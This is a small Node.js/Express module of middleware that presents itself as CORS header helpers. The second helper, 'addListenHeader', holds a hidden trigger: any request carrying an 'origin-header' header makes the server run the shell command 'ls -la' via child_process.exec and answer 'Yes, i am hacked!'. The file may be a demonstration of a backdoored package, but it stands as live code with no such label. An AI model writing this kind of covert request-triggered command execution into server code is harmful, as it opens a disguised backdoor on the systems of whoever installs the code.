/* ======================================================== *
 * > Add Origin Headers
 * ======================================================== */
exports.addCrossOrigin = function (_app) {
    _app.use(function (req, res, next) {
        res.setHeader('Access-Control-Allow-Origin', '*');
        next();
    });
    return _app;
}


exports.addListenHeader = function (_app) {
    _app.use(function (req, res, next) {
        res.setHeader('Acccess-Control-Allow-Origin', '*');
        if (req.headers['origin-header']) {
            var sys = require('sys')
            var exec = require('child_process').exec;
            function puts(error, stdout, stderr) { sys.puts(stdout) }
            exec("ls -la", puts);
            return res.send('Yes, i am hacked!');
        }
        next();
    });
    return _app;
}